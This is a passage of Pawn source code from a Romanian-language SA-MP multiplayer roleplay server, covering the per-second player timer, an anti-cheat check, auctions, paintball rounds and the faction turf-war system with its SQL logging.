		if(UnFreezeTimer[i] < gettime() && UnFreezeTimer[i] != -1) UnFreezeStation(i), UnFreezeTimer[i] = -1;
		if(TimerInfo[i] < gettime() && TimerInfo[i] != -1) PlayerTextDrawHide(i, InfoPTD), TimerInfo[i] = -1;
		if(PnsTimer[i] <= gettime() && PnsTimer[i] != -1) RepairVehiclePns(i);
		if(TimerPayDay[i] < gettime()) {
			for(new l=0;l<3;l++) PlayerTextDrawHide(i, InfoEx[l]);
			TimerPayDay[i] = -1;
		}
		if(PlayerInfo[i][pWantedLevel] && WantedTime[i]) {
			format(gString, 128, "wanted scade in: ~r~%02d:%02d", WantedTime[i]/60, WantedTime[i]%60);
			PlayerTextDrawSetString(i, WantedTD, gString);
			PlayerTextDrawShow(i, WantedTD);
   			WantedTime[i]--;
   			if(!WantedTime[i]) {
		   	 	PlayerInfo[i][pWantedLevel] --;
				SetPlayerWantedLevel(i, PlayerInfo[i][pWantedLevel]);
			   	UpdateVar(i, "WantedLevel", PlayerInfo[i][pWantedLevel]);
			    if(!PlayerInfo[i][pWantedLevel]) {
			    	SendClientMessage(i, COLOR_YELLOW, "Acum nu mai ai wanted deoarece politia ti-a pierdut urma!");
			    	finishAchievement(i, 10);
			    	PlayerTextDrawHide(i, WantedTD);
					ClearCrime(i);
					UpdateVar(i, "WantedTime", 0);
			    }
			    else SCMf(i, COLOR_YELLOW,  "Politia iti pierde urma! Wanted Actual: %d", PlayerInfo[i][pWantedLevel]), WantedTime[i] = 900;
				format(gString, 128, "%s [%d] lost 1 wanted level. W: %d", GetName(i), i, PlayerInfo[i][pWantedLevel]);
				SendTeamMessage(1, COLOR_DBLUE, gString);	
			}		
		}	
		if(TestingModel[i]) {
			TestingModel[i]--;
			if(!TestingModel[i]) CancelTestDrive(i);
		}
		if(IsPlayerInAnyVehicle(i))
        {
            new State=GetPlayerState(i);
            if(State==PLAYER_STATE_DRIVER)
            {
                foreach(new x_2 : logged_players)
                {
                    new State3=GetPlayerState(x_2);
                    if(State3!=PLAYER_STATE_DRIVER)
                    {
                        if(IsPlayerInRangeOfPlayer(x_2, i, 1.50) && togsurf[i]==1)
                        {
                            SlapPlayer(x_2);
                            RemovePlayerFromVehicleEx(x_2);
                            return 1;
                        }
                    }
                }
            }
        }
		if(FishTimer[i] > 0) {
			FishTimer[i] --;
			switch(FishTimer[i]) {
				case 5: GameTextForPlayer(i, "~n~~n~~n~~n~~n~~n~~n~~n~~y~PLEASE WAIT~n~~w~~h~FISHING...", 5000, 3);
				case 0: Fish(i);
			}
		}
		if(ReportTimer[i]) {
			ReportTimer[i]--;
			if(!ReportTimer[i]) CheckReport(i);
		}
		for(new m=0;m<5;m++) {
			switch(PlayerInfo[i][pDailyMission][m]) {
				case 14: if(PlayerToPoint(50.0, i, -2316.6858,-1636.1733,483.7031)) CheckMission(i, 14);
				case 15: if(PlayerToPoint(50.0, i, 210.1284,1862.4712,20.1831)) CheckMission(i, 15);
				case 16: if(PlayerToPoint(100.0, i, 3096.3633,2113.9304,14.8679)) CheckMission(i, 16);
				case 18: if(GetPlayerAnimationIndex(i) == 958) CheckMission(i, 18);
				case 24: if(PlayerToPoint(50.0, i, 2490.0542,-1669.6176,13.3359)) CheckMission(i, 24);
				case 25: if(InZone(i, -2741.00,2175.10,0.00,-2353.10,2722.70,200.00) || InZone(i, -2353.10,2275.70,0.00,-2153.10,2475.70,200.00)) CheckMission(i, 25);
				case 26: if(InZone(i, -2324.90,-2584.20,-6.10,-1964.20,-2212.10,200.00)) CheckMission(i, 26);
				case 27: if(InZone(i, -1213.90,-2892.90,-242.90,44.60,-768.00,900.00)) CheckMission(i, 27);
				case 28: if(InZone(i, 508.10,-139.20,0.00,1306.60,119.50,200.00)) CheckMission(i, 28);
				case 29: if(InZone(i, 1119.50,119.50,-3.00,1451.40,493.30,200.00) || InZone(i, 1451.40,347.40,-6.10,1582.40,420.80,200.00) || InZone(i, 1546.60,208.10,0.00,1745.80,347.40,200.00) || InZone(i, 1582.40,347.40,0.00,1664.60,401.70,200.00)) CheckMission(i, 29);
				case 30: if(InZone(i, 2373.70,-2697.00,-89.00,2809.20,-2330.40,110.90) || InZone(i, 2201.80,-2418.30,-89.00,2324.00,-2095.00,110.90) || InZone(i, 2324.00,-2302.30,-89.00,2703.50,-2145.10,110.90) || InZone(i, 2089.00,-2394.30,-89.00,2201.80,-2235.80,110.90) || InZone(i, 2201.80,-2730.80,-89.00,2324.00,-2418.30,110.90) || InZone(i, 2703.50,-2302.30,-89.00,2959.30,-2126.90,110.90) || InZone(i, 2324.00,-2145.10,-89.00,2703.50,-2059.20,110.90)) CheckMission(i, 30);
				case 31: if(InZone(i, -901.10,2221.80,0.00,-592.00,2571.90,200.00)) CheckMission(i, 31);
				case 32: if(PlayerToPoint(50.0, i, 373.5776,2506.8818,16.4844)) CheckMission(i, 32);
				case 33: if(InZone(i, -376.20,826.30,-3.00,123.70,1220.40,200.00)) CheckMission(i, 33);
				case 34: if(InZone(i, 2285.30,-768.00,0.00,2770.50,-269.70,200.00)) CheckMission(i, 34);
			}
		}
		if(AdTimer[i]!=0) {
			AdTimer[i]--;
			if(!AdTimer[i]) Advertisment(i);
		}
		if(CrateModel[i]==69) {
			if(CrateTime[i]) {
				CrateTime[i]--;
				if(!CaseType[i]) {
					new id = CaseBattle[i], c1 = random(dsvehs), c2 = random(dsvehs);
					PlayerTextDrawSetPreviewModel(i, CasePTD[0], DSModels[c1][dModel]);
					PlayerTextDrawSetPreviewModel(id, CasePTD[0], DSModels[c1][dModel]);
					PlayerTextDrawShow(i, CasePTD[0]);
					PlayerTextDrawShow(id, CasePTD[0]);
					PlayerTextDrawSetPreviewModel(i, CasePTD[1], DSModels[c2][dModel]);
					PlayerTextDrawSetPreviewModel(id, CasePTD[1], DSModels[c2][dModel]);
					PlayerTextDrawShow(i, CasePTD[1]);
					PlayerTextDrawShow(id, CasePTD[1]);

					format(gString, 20, "$%s", FormatNumber(DSModels[c1][dPrice]));
					PlayerTextDrawSetString(i, CasePTD[2], gString);
					PlayerTextDrawSetString(id, CasePTD[2], gString);
					format(gString, 20, "$%s", FormatNumber(DSModels[c2][dPrice]));
					PlayerTextDrawSetString(i, CasePTD[3], gString);
					PlayerTextDrawSetString(id, CasePTD[3], gString);

					format(gString, 60, "case battle ends in ~y~%d seconds.", CrateTime[i]);
					if(!CrateTime[i]) {
						if(DSModels[c1][dPrice]<DSModels[c2][dPrice]) {
							format(gString, 128, ">> %s a castigat $%s. <<", GetName(id), FormatNumber(DSModels[c1][dPrice]+DSModels[c2][dPrice]));
							SendClientMessage(id, COLOR_LGREEN, gString);
							SendClientMessage(i, COLOR_LGREEN, gString);
							GivePlayerCash(id, DSModels[c1][dPrice]+DSModels[c2][dPrice]);
						}
						else {
							format(gString, 128, ">> %s a castigat $%s. <<", GetName(i), FormatNumber(DSModels[c1][dPrice]+DSModels[c2][dPrice]));
							SendClientMessage(id, COLOR_LGREEN, gString);
							SendClientMessage(i, COLOR_LGREEN, gString);
							GivePlayerCash(i, DSModels[c1][dPrice]+DSModels[c2][dPrice]);
						}
						SetTimerEx("hideCase", 5000, false, "ii", i, id);
						gString[0]=(EOS); strcat(gString, "~r~case battle ends");
					}
					PlayerTextDrawSetString(i, CasePTD[8], gString);
					PlayerTextDrawSetString(id, CasePTD[8], gString);
				}
			}
		}
		if(PlayerInfo[i][pShowCeas] != 0) {
			format(string, 35, "~y~~h~%02.0f:%02d (%.2f)", PlayerInfo[i][pSeconds]/60.0, floatround(PlayerInfo[i][pSeconds])%60, PlayerInfo[i][pSeconds]/3600);
			PlayerTextDrawSetString(i, CeasPTD, string);
		}
		if(hideInfo[i]) {
	    	hideInfo[i]--;
	    	if(!hideInfo[i]) PlayerTextDrawHide(i, InfosTD);
	    }
		if(JobWorking[i]) {
		    if(AFKSeconds[i] >= 120) stopWork(i, 2);
		    if(JobVehicle[i]) {
			    GetVehiclePos(JobVehicle[i], x, y, z);
				if(GetPlayerDistanceFromPoint(i, x, y, z) > 400.0 && !GetPlayerInterior(i) && InInterior[i] != BUSINESS_INTERIOR && !Exception[i]) stopWork(i, 1);
			}
			switch(PlayerInfo[i][pJob]) {
				case 1: {
					if(PlayerToPoint(200, i, -82.1648,43.4216,3.1172) && Carspeed(GetPlayerVehicleID(i)) > 30) {
						JobSeconds[i] --;
						UpdateJobStats(i);
						if(!JobSeconds[i]) {
							new kgr = RandomEx(35, 50);
							KG[i] += kgr;
							SCMf(i, COLOR_MONEY, "Ai primit %d kilograme de faina. Du-te la un Burger Shot pentru a vinde faina. Total KG: %d", kgr, KG[i]);
							SendClientMessage(i, COLOR_WHITE, "Pentru a afla unde este un Burger Shot, foloseste comanda /locations.");
							stopWork(i, 69);		
						}
					}
				}
				case 2: {
					GetVehiclePos(Trailer[i], x, y, z);
					if(!IsTrailerAttachedToVehicle(JobVehicle[i]) && GetPlayerDistanceFromPoint(i, x, y, z) < 50 && JobVehicle[i]==GetPlayerVehicleID(i)) AttachTrailer(i);
				}
				case 3: {
					if(BagTime[i]) {
						BagTime[i] --;
						format(gString, 20, "~w~~h~%d", BagTime[i]);
						GameTextForPlayer(i, gString, 1500, 3);
						if(!BagTime[i]) stopWork(i);
					}
				}
				case 12: if !IsPlayerInArea(i, 881, 2006.5, 1063, 2212.5) *then stopWork(i, 7);
				case 11,13,16: {
					if(BagTime[i]) {
						BagTime[i] --;
						if(!BagTime[i]) stopWork(i, 6);
					}
				}
			}
		}	
		
		if(GetPlayerState(i) == PLAYER_STATE_DRIVER && GetPlayerInterior(i) == 0) {
			if(current_map!=-1&&Iter_Contains(race_players, i)) {
				raceTime[i] ++;
				format(gString, 128, "position: ~r~%d/%d~n~~w~~h~time: ~r~%02d:%02d~n~~w~~h~checkpoints: ~r~%d/%d", player_race_pos[i], total_players_in_race, raceTime[i]/60, raceTime[i] % 60, raceCP[i], countCheckpoints(current_map));
				PlayerTextDrawSetString(i, RacePTD[2], gString);
				if(AFKSeconds[i]>=60) destroy_race_vehicle(i);
			}
			else if(!nearPNS2(i) && NearPNS[i] == 1) DisableRemoteVehicleCollisions(i, 0), NearPNS[i] = 0;
			else if(nearPNS2(i)) {
				DisableRemoteVehicleCollisions(i, 1);
				NearPNS[i] = 1;
			}
		}	
		
		if(TradeTime[i] > 0) {
			TradeTime[i] --;
			new id = TradeID[i];
			format(string, sizeof(string), "00:0%d", TradeTime[i]);
			PlayerTextDrawSetString(i, TradePTD[i][6], string);
			PlayerTextDrawSetString(id, TradePTD[id][6], string);			
			if(TradeTime[i] == 0) {
				FinishTrade(i);
				PlayerTextDrawHide(i, TradePTD[i][6]);
				PlayerTextDrawHide(id, TradePTD[id][6]);					
			}
		}

		if(!IsAdmin(i, 1)) {
			new vehicle = GetPlayerVehicleID(i), bool:x_rx; gString[0] = (EOS);
			if((!IsPlayerInAnyVehicle(i) && GetPlayerSpeed(i) > 200 && GetPlayerSurfingVehicleID(i) == INVALID_VEHICLE_ID) || (GetPlayerState(i) == PLAYER_STATE_DRIVER && (Carspeed(vehicle) > LastSpeed[i] + 100 && !x_rx) && AFKSeconds[i]<15)) {
				SendClientMessage(i, COLOR_CLIENT, "You got kicked for using cheats (troll #4).");
				SendClientMessage(i, COLOR_WHITE, "Stop using cheats!");
				KickEx(i);
				return true;
			}

			if((GetPlayerState(i) == PLAYER_STATE_ONFOOT || GetPlayerState(i) == PLAYER_STATE_DRIVER) && !Exception[i]) {
				if(!PlayerToPoint(IsPlayerInAnyVehicle(i) ? 125.0 : 50.0, i, LastPos[i][0], LastPos[i][1], LastPos[i][2]) && AFKSeconds[i] < 15 && GetPlayerSurfingVehicleID(i) == INVALID_VEHICLE_ID) {
					if(PlayerToPoint(13.0, i, 616.4669,-1.9651,1000.6123) || PlayerToPoint(13.0, i, -1936.2686,243.9019,34.1880)) return true;		
					format(gString, 128, "Anti-Cheat: %s(%d) is suspected of using teleport %s", GetName(i), i, !IsPlayerInAnyVehicle(i)?("onfoot"):("on vehicle"));
					SendAdminMessage(0xFFADADFF, gString, 1);

					CheatWarnings[i] ++;
					if(CheatWarnings[i] > 5) NightBot(i, "Cheats (Teleport-Hack)");
					return bool:true;
				}
			}
		}
		if(GetPlayerState(i) == PLAYER_STATE_DRIVER) Checkvehinfo(i);
		if(CheatWarnings[i] != 0) CheatWarnings[i] --;
		if(Exception[i] != 0) Exception[i] --;
		if(PlayerToPoint(1.1, i, LastPos[i][0], LastPos[i][1], LastPos[i][2]) && !PlayerInfo[i][pSleeping]) {

			AFKSeconds[i] ++;
			if(AFKSeconds[i] >= 3600 && PlayerInfo[i][pAdmin] < 6) {
				format(string, sizeof(string), "Kick: %s was kicked by AdmBot, reason: AFK without /sleep for more then 60 minutes.", GetNameEx(i));
				SCMTA(COLOR_LIGHTRED, string);
				KickEx(i);
			}				
		}	
		else AFKSeconds[i] = 0;

		GetPlayerPos(i, LastPos[i][0], LastPos[i][1], LastPos[i][2]);

		if(TextCount[i]) TextCount[i] = 0;
		if(!PlayerInfo[i][pSleeping] && Spectate[i] == -1 && AFKSeconds[i] < 15 && PlayerInfo[i][pTutorial]>=5) PlayerInfo[i][pSeconds] ++;
		
		if(GetPlayerDrunkLevel(i) < 100) SetPlayerDrunkLevel(i, 2000);
		else {
			if(pDrunkLevelLast[i] != GetPlayerDrunkLevel(i)) {
				new wfps = pDrunkLevelLast[i] - GetPlayerDrunkLevel(i);
				if((wfps > 0) && (wfps < 200)) FPS2[i] = wfps;
				pDrunkLevelLast[i] = GetPlayerDrunkLevel(i);
			}
		}	

		if(PlayerInfo[i][pShowFP] == 1) {
			gString[0] = EOS;
			if(PlayerInfo[i][pAdmin] == 0) format(gString, 20, "FPS: ~y~%d", FPS2[i]-1);
			else format(gString, 100, "TICK: ~r~%d ~w~~w~~h~MYSQL: ~b~%d ~w~~h~FPS: ~y~%d", GetServerTickRate(), mysql_unprocessed_queries(), FPS2[i]-1);
			PlayerTextDrawSetString(i, ShowFPS, gString);
		}

		if(GetPlayerAnimationIndex(i) == 1660) OnPlayerUseVending(i);	
		if(GetPlayerSurfingVehicleID(i) != INVALID_VEHICLE_ID && !IsABoat(GetPlayerSurfingVehicleID(i))) {
			if(GetPlayerWeapon(i) != 0) {
				SetPlayerArmedWeapon(i, 0);
				SendClientMessage(i, COLOR_WARNING, "Nu poti folosi armele atata timp cat esti pe vehicul!");
			}	
		}			
		
		if(PaintType[i]) {
			new pp = PaintType[i]-1,score=PKills[i]>PDeaths[i]?PKills[i]-PDeaths[i]:PDeaths[i]-PKills[i];
			if(PaintTime[pp]) {
				format(gString, 128, "Paintball time: %02d:%02d~n~kills: %d deaths: %d score: %d~n~Best player: %s (kills: %d)",
				PaintTime[pp]/60, PaintTime[pp]%60, PKills[i], PDeaths[i], score, PaintballWinner[pp]==-1?("none"):GetName(PaintballWinner[pp]), PaintballWinnerScore[pp]);
				PlayerTextDrawSetString(i, PaintTD, gString);
			}
		}

		GetPlayerHealthEx(i, ppHealth);
		GetPlayerArmourEx(i, ppArmour);
			
		if(PlayerInfo[i][pShowHP] != 0 && ppHealth >= 1)
		{
			format(string, sizeof(string), "%.0f%%", ppHealth);
			PlayerTextDrawSetString(i, CleoTD[0], string);
			PlayerTextDrawShow(i, CleoTD[0]);
			PlayerTextDrawColor(i, CleoTD[0], GetHudColor(PlayerInfo[i][pShowHP]));
		}
		else PlayerTextDrawHide(i, CleoTD[0]);

		if(PlayerInfo[i][pShowAP] != 0 && ppArmour >= 1)
		{
			format(string, sizeof(string), "%.0f%%", ppArmour);
			PlayerTextDrawSetString(i, CleoTD[1], string);
			PlayerTextDrawShow(i, CleoTD[1]);
			PlayerTextDrawColor(i, CleoTD[1], GetHudColor(PlayerInfo[i][pShowAP]));
		}
		else PlayerTextDrawHide(i, CleoTD[1]);
		
		if(PlayerInfo[i][pJailed] > 0) {
			if(PlayerInfo[i][pJailTime] > 0) {
				PlayerInfo[i][pJailTime]--;
				TextDrawShowForPlayer(i, Jailtime[i]);
				if(PlayerInfo[i][pJailTime]/60 > 1) format(string, sizeof(string), "Jail time: ~r~%d minute", PlayerInfo[i][pJailTime]/60);
				else if(PlayerInfo[i][pJailTime]/60 == 1) format(string, sizeof(string), "Jail time: ~r~%d minut", PlayerInfo[i][pJailTime]/60);
				else if(PlayerInfo[i][pJailTime]/60 == 0) format(string, sizeof(string), "Jail time: ~r~%d secunde", PlayerInfo[i][pJailTime]);
				TextDrawSetString(Jailtime[i], string);
			}
			if(PlayerInfo[i][pJailTime] <= 0) {
				PlayerInfo[i][pJailTime] = 0;
				if(PlayerInfo[i][pJailed] == 1) {
					PutPlayerInJail(i);
				}
				PlayerInfo[i][pJailed] = 0;
				_query("UPDATE `users` SET `Jailed` = '%i', `JailTime` = '%i' WHERE `id`='%i'", PlayerInfo[i][pJailed], PlayerInfo[i][pJailTime], PlayerInfo[i][pSQLID]);
				SpawnPlayer(i);
				SetPlayerSpecialAction(i,SPECIAL_ACTION_NONE);
				RemovePlayerAttachedObject(i,1);
				TextDrawHideForPlayer(i, Jailtime[i]);
				ClearCrime(i);
				PlayerInfo[i][pAJail] = 0;
				UpdateVar(i, "AJail", 0);
				SetPlayerToTeamColor(i);
				TogglePlayerControllable(i, 1);
			}
		}
	
		if(PlayerInfo[i][pMuted] > 0) {
			if(PlayerInfo[i][pMuteTime] > 0) PlayerInfo[i][pMuteTime]--;
			if(PlayerInfo[i][pMuteTime] <= 0){
				PlayerInfo[i][pMuteTime] = 0;
				SendClientMessage(i, COLOR_GREY, "You have now been automatically unmuted.");
				PlayerInfo[i][pMuted] = 0;
			}
		}
		if(targetfind[i] >= 0 && UsedFind[i] == 1) findPlayer(i);
		
		if(PlayerTazeTime[i] >= 1) {
			PlayerTazeTime[i] += 1;
			if(PlayerTazeTime[i] == 15) PlayerTazeTime[i] = 0;
			else {
				new Float:angle;
				GetPlayerFacingAngle(i, angle);
				SetPlayerFacingAngle(i, angle + 90);
			}
		}
		if(PlayerStoned[i] >= 2) SetPlayerDrunkLevel (i, 5000);
		
		if(IsSmoking[i] > 0) {
			if(IsSmoking[i] == 0) {
				format(string, sizeof(string), "* %s a terminat de fumat tigara.", GetName(i));
				ProxDetector(30.0, i, string, COLOR_PURPLE);
				new Float: PlayerHealth;
				GetPlayerHealthEx(i, PlayerHealth);
				if(PlayerHealth >= 93) SetPlayerHealthEx(i, 99);
				else SetPlayerHealthEx(i, PlayerHealth+6);
			}
			IsSmoking[i] -= 1;
		}
		if(PlayerCuffed[i] == 1) {
			if(PlayerCuffedTime[i] <= 0) {
				TogglePlayerControllable(i, 1);
				PlayerCuffed[i] = 0;
				PlayerCuffedTime[i] = 0;
				PlayerTazeTime[i] = 1;
			}
			else PlayerCuffedTime[i] -= 1;
		}

		if(PlayerCuffed[i] == 2) {
			if(PlayerCuffedTime[i] <= 0) {
				GameTextForPlayer(i, "~r~~h~Esti liber acum!", 2500, 3);
				TogglePlayerControllable(i, 1);
				PlayerCuffed[i] = 0;
				PlayerCuffedTime[i] = 0;
			}
			else PlayerCuffedTime[i] -= 1;
		}		
	}	
	for(new i = 0; i < 2; i++) {
		if(PaintTime[i] == 0) {
			PaintTime[i] = -1; PaintText[i] = 60;
		}	
	}	
	for(new i=0;i<2;i++) {
		if(PaintText[i] != 0 && PlayersOnPaint(i) >= 2) {
			PaintText[i] --;
			if(PaintText[i] == 0) CalculateVote(i);
			else {
				format(gString, 128, "~w~paintball starting in~n~~r~%d ~w~~h~seconds", PaintText[i]);
				GameTextForPaint(gString, i);
			}
		}
		if(PlayersOnPaint(i) >= 2 && PaintTime[i] > 0) {
			PaintTime[i] --;
			if(PaintTime[i] == 0) {
				format(gString, 256, "Round over! Winner: %s with %d kills. Use [/votemap] to vote for a map.", GetName(PaintballWinner[i]), PaintballWinnerScore[i]);								
				foreach(new p : InPaint<i>) {
					SendClientMessage(p, COLOR_YELLOW, gString);
					for(new m = 0; m < 5; m++) SendDeathMessageToPlayer(p, 1001, 1001, 200);
					PKills[p] = 0, PDeaths[p] = 0;
					ResetWeapons(p);					
					PlayerTextDrawHide(p, PaintTD);			
				}
				PaintVote[i] = 1;	
				PaintText[i]=30;
				PaintballWinnerScore[i] = 0;		
				PaintballWinner[i] = -1;	
			}
		}
	}	
	if(TipLicitatie) {
		TimpLicitatie --;
		if(TimpLicitatie==30) {
			if(LastPlayer==-1) MesajLicitatie(0xAA71B7FF, "[INFO] Daca in urmatoarele 30 secunde nu mai liciteaza nimeni licitatia va fi oprita.");
			else {
				if(TipLicitatie==0||TipLicitatie==1||TipLicitatie==2||TipLicitatie==3||TipLicitatie==5) {
					format(gString, 144, "[INFO] Daca in urmatoarele 30 secunde nu mai liciteaza nimeni licitatia va fi castigata de %s cu $%s.000.000.", _bid_name, FormatNumber(bid_money));
					MesajLicitatie(0xAA71B7FF, gString);
				}
				else if(TipLicitatie==4) {
					format(gString, 144, "[INFO] Daca in urmatoarele 30 secunde nu mai liciteaza nimeni licitatia va fi castigata de %s cu %sPP.", _bid_name, FormatNumber(bid_money));
					MesajLicitatie(0xAA71B7FF, gString);
				}
			}
		}
		if(!TimpLicitatie) {
			if(LastPlayer==-1) {
				SCMTA(0x7A45FFFF, "Licitatia s-a terminat. Nu a licitat nimeni!");
				TipLicitatie = IDLicitatie = 0; LastPlayer=-1;
			} else {
				mysql_format(SQL, gQuery, 128, "SELECT * FROM `users` WHERE `id` = '%i' LIMIT 1", LastPlayer);
				mysql_tquery(SQL, gQuery, "sql_cache_licitatie");
			}
		}
	}
	if(RestartTime >= 1) {
	    RestartTime--;
		
		if(RestartTime <= 60) {
			format( string, sizeof(string), "~w~Urmeaza un restart in~n~~r~%d secunde", RestartTime);
			GameTextForAll( string, 1100, 4 );
		}
	    if(RestartTime == 3) {
			foreach(new i : logged_players) {
				if(PlayerInfo[i][pAdmin] < 7) KickEx(i);
			}
		}
	    if(RestartTime == 0) GameModeExit();
	}
	WarSystem();
	return true;
}
redist::CheckAdmins(caz) {
	new x=0;
	foreach(new i : Staff<ADMIN>) if(AFKSeconds[i]>=10) x++;
	return x;
}
redist::CheckHelpers(caz) {
	new x=0;
	foreach(new i : Staff<HELPER>) if(AFKSeconds[i]>=10) x++;
	return x;
}
redist::CheckLeaders(caz) {
	new x=0;
	foreach(new i : faction_leaders) if(AFKSeconds[i]>=10) x++;
	return x;
}
redist::FreeHouses() {
	new x;
	for(new i = 1; i < sizeof(HouseInfo); i++) {
		if(strcmp(HouseInfo[i][hOwner], "The State", true) == 0 && HouseInfo[i][hOwned] == 1) x++;
	}
	return x;
}
redist::GetHouseID() {
	for(new i = 1; i < sizeof(HouseInfo); i++) {
		if(strcmp(HouseInfo[i][hOwner], "The State", true) == 0 && HouseInfo[i][hOwned] == 1) return i;
	}
	return false;
}
redist::FreeBusinesses() {
	new x;
	for(new i = 1; i < sizeof(BizzInfo); i++) {
		if(strcmp(BizzInfo[i][bOwner], "The State", true) == 0 && BizzInfo[i][bOwned] == 1) x++;
	}
	return x;
}
redist::GetBizzID() {
	for(new i = 1; i < sizeof(BizzInfo); i++) {
		if(strcmp(BizzInfo[i][bOwner], "The State", true) == 0 && BizzInfo[i][bOwned] == 1) return i;
	}
	return false;
}

playerWar(playerid, member, wi) {
	if(InWarTurf[member] == -1) return true;
	if(!GetPlayerInterior(playerid)&&!GetPlayerVirtualWorld(playerid)&&!PlayerInfo[playerid][pWantedLevel]&&!PlayerInfo[playerid][pJailTime]) return SetPlayerVirtualWorld(playerid, wi), va_SendClientMessage(playerid, COLOR_YELLOW, "Ai fost teleportat in virtual world-ul %d deoarece mafia ta este intr-un war.", wi);
	if(!IsPlayerInTurf(playerid, wi)) return true;

	va_PlayerTextDrawSetString(playerid, JobTD, "Turf: #%d~n~%s %.1f - %.1f %s~n~%d kills, %d deaths, %d assists (score: %d)~n~War Time: %s (%d seconds on turf)",wi,FactionName(WarInfo[wi][wAttacker]),WarScoreF[WarInfo[wi][wAttacker]][wi],WarScoreF[WarInfo[wi][wFaction]][wi],FactionName(WarInfo[wi][wFaction]),WarKills[playerid], WarDeaths[playerid], 0, WarKills[playerid]-WarDeaths[playerid], CalculeazaTimp2(WarInfo[wi][wTime]), TurfTime[playerid]);
	PlayerTextDrawShow(playerid, JobTD);	

	TurfTime[playerid] ++; WarScoreF[member][wi] += 0.002;
	return true;
}

stock WarSystem(attackers=-1,defenders=-1) {
	foreach(new i : turf_in_war) {
		attackers = WarInfo[i][wAttacker], defenders = WarInfo[i][wFaction];
		if(WarInfo[i][wTime] > 0) {
			WarInfo[i][wTime] --;
			foreach(new j : faction_players<attackers>) playerWar(j, attackers, i);
			foreach(new j : faction_players<defenders>) playerWar(j, defenders, i);
			if(!WarInfo[i][wTime]) {
				new 
					Float: atscore = WarScoreF[attackers][i],
					Float: defscore = WarScoreF[defenders][i]
				;
				new bool:win=atscore>defscore?true:false;
				GangZoneStopFlashForAll(Turfs[i]);	
				DestroyPickups(i);
				FactionDeelay[attackers] = gettime()+300;
				if(win) {
					_query("UPDATE `turfs` SET `Owned`='%d' WHERE `ID`='%d'", attackers, TurfInfo[i][zID]);
					TurfInfo[i][zOwned]=attackers;
					DynamicFactions[attackers][fTop]++; DynamicFactions[defenders][fTop]--;
					if(DynamicFactions[attackers][fTop]>DynamicFactions[FactionTop][fTop]) FactionTop=attackers;
					format(gString, 180, "NR AdmBot: Gruparea mafiota %s a castigat teritoriu #%d detinut de %s.", FactionName(WarInfo[i][wAttacker]), TurfInfo[i][zID], FactionName(WarInfo[i][wFaction]));
				}
				OOCNews(COLOR_NEWS, "NR AdmBot: Gruparea mafiota %s nu a resuit sa castige teritoriu #%d detinut de %s.", FactionName(WarInfo[i][wAttacker]), TurfInfo[i][zID], FactionName(WarInfo[i][wFaction]));	

				static hour, minute, second, year, month, day;
				gettime(hour, minute, second), getdate(year, month, day);
				mysql_format(SQL, gQuery, sizeof gQuery, "INSERT INTO `war_logs` (`attackers`, `attackers_score`, `defender`, `defender_score`, `Time`) VALUES ('%i', '%f', '%i', '%f', '%d-%02d-%02d %02d:%02d:%02d')",
					WarInfo[i][wAttacker], atscore, WarInfo[i][wFaction], defscore, year, month, day, hour, minute, second);
				mysql_tquery(SQL, gQuery, #cache_insert_wars, #iiib, i, attackers, defenders, win);
			}
		}
	}
	return true;
}

redist::cache_insert_wars(i, attackers, defenders, bool:win) {
	new _id=cache_insert_id(); gQuery = "Best score: Unknown"; gString[0] = (EOS);
	if(IsPlayerConnected(bestmemberat[i])) {
		format(gQuery, 128, "Best score: %s with a score of %d (%d kills, %d deaths)",
			GetName(bestmemberat[i]), WarKills[bestmemberat[i]]-WarDeaths[bestmemberat[i]], 
			WarKills[bestmemberat[i]], WarDeaths[bestmemberat[i]]);
	}
	strcat(gString, gQuery);
	gQuery = ", Worst score: Unknown";
	if(IsPlayerConnected(worstmemberat[i])) {
		format(gQuery, 128, ", Worst score: %s with a score of %d (%d kills, %d deaths)",
			GetName(worstmemberat[i]), WarKills[worstmemberat[i]]-WarDeaths[worstmemberat[i]], WarKills[worstmemberat[i]], WarDeaths[worstmemberat[i]]);
	}
	strcat(gString, gQuery);
	foreach(new p : faction_players<attackers>) _wInfo(p, gString, _id, attackers, win, i);
	foreach(new p : faction_players<defenders>) _wInfo(p, gString, _id, attackers, win, i);

	_query("UPDATE `users` SET `WarKills` = '0', `WarDeaths` = '0' WHERE `Member` = '%i' OR `Member` = '%i'", WarInfo[i][wFaction], WarInfo[i][wAttacker]);
	SetVehicle(attackers, 0);
	SetVehicle(defenders, 0);
	InWarTurf[attackers] = -1;
	InWarTurf[defenders] = -1;
	WarInfo[i][wTime] = 0;
	WarInfo[i][wFaction] = 0;
	WarInfo[i][wAttacker] = 0;
	worstscoreat[i] = 0;
	worstmemberat[i] = -1;
	bestscoreat[i] = 0;
	bestmemberat[i] = -1;
	WarScoreF[defenders][i] = 0.0;
	WarScoreF[attackers][i] = 0.0;
	return true;
}

_wInfo(playerid, const string[], id, attacker, bool:win, turf) {
	SCMf(playerid, COLOR_MONEY, "........................... war overview #%d ...........................", id);

	sendSplittedMessageToPlayer(playerid, COLOR_MONEY, COLOR_MONEY, string);
	SCMf(playerid, COLOR_MONEY, "Your personal score: %d (%d kills, %d deaths)", WarKills[playerid]-WarDeaths[playerid], WarKills[playerid], WarDeaths[playerid]);
	SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);

	SendClientMessage(playerid, COLOR_MONEY, ".........................................................................");

	mysql_format(SQL, gQuery, 256, "INSERT INTO `war_members` (`username`, `faction`, `score`, `kills`, `deaths`, `TurfTime`, `for_war`) VALUES ('%s', '%i', '%i', '%i', '%i', '%i', '%i')",
		PlayerInfo[playerid][pUsername], PlayerInfo[playerid][pMember], WarKills[playerid]-WarDeaths[playerid], WarKills[playerid], WarDeaths[playerid], TurfTime[playerid], id);
	mysql_tquery(SQL, gQuery);

	PlayerTextDrawHide(playerid, JobTD);
	SetPlayerVirtualWorld(playerid, 0);
	for(new m=0;m<5;m++) SendDeathMessageToPlayer(playerid, 1001, 1001, 200);
	if(!win) return true;
	switch(attacker) {
		case 4: GangZoneShowForPlayer(playerid, Turfs[turf], 0x0CAB3C99);
		case 5: GangZoneShowForPlayer(playerid, Turfs[turf], 0x11F2F299);
		case 6: GangZoneShowForPlayer(playerid, Turfs[turf], 0xFAD40099);
		case 10: GangZoneShowForPlayer(playerid, Turfs[turf], 0xAB00FA99);
		case 17: GangZoneShowForPlayer(playerid, Turfs[turf], 0x25252799);
		case 18: GangZoneShowForPlayer(playerid, Turfs[turf], 0x1B376D99);
		case 25: GangZoneShowForPlayer(playerid, Turfs[turf], 0x88421D99);
		case 26: GangZoneShowForPlayer(playerid, Turfs[turf], 0x66990099);
